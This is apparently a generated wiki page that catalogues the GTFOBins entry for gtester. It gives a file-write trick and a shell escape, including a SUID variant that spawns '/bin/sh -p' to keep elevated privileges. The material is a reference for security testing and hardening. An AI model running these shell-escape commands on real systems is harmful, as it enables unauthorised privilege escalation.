---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# gtester

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `gtester` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gtester` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [gtester](../../tools/linux/gtester.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | gtester |
| name | gtester |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/gtester/ |

## Preserved Source Material

```yaml
_body: ''
_name: gtester
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gtester
functions:
  file-write:
  - code: gtester DATA -o /path/to/output-file
    comment: Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'echo ''exec /bin/sh 0<&1'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      gtester -q /path/to/temp-file'
    contexts:
      sudo: null
      suid:
        code: 'echo ''#!/bin/sh -p'' >/path/to/temp-file

          echo ''exec /bin/sh -p 0<&1'' >>/path/to/temp-file

          chmod +x /path/to/temp-file

          gtester -q /path/to/temp-file'
        shell: false
      unprivileged: null
```
